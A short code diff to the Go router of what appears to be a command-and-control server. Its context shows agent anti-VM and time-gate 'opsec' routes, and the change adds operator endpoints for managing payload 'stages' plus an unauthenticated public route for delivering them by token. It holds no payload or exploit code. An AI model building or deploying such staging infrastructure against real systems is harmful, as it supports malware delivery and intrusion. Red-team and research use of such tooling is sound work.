@@ -143,12 +143,20 @@ func (r *Router) Setup() *gin.Engine {
 		v1.POST("/agent/:id/opsec/antivm", r.handlers.AntiVM)
 		v1.POST("/agent/:id/opsec/timegate", r.handlers.TimeGateSet)
 
+		// Stage management (operator)
+		v1.POST("/stage", r.handlers.CreateStage)
+		v1.GET("/stages", r.handlers.ListStages)
+		v1.DELETE("/stage/:token", r.handlers.DeleteStage)
+
 		// Monitoring
 		v1.GET("/stats", r.handlers.GetStats)
 		v1.GET("/health", r.handlers.HealthCheck)
 		v1.GET("/logs", r.handlers.GetLogs)
 		v1.GET("/queue/stats", r.handlers.GetQueueStats)
 	}
+
+	// Public stage delivery endpoint — no auth, token is the credential
+	router.GET("/stage/:token", r.handlers.ServeStage)
 
 	return router
 }
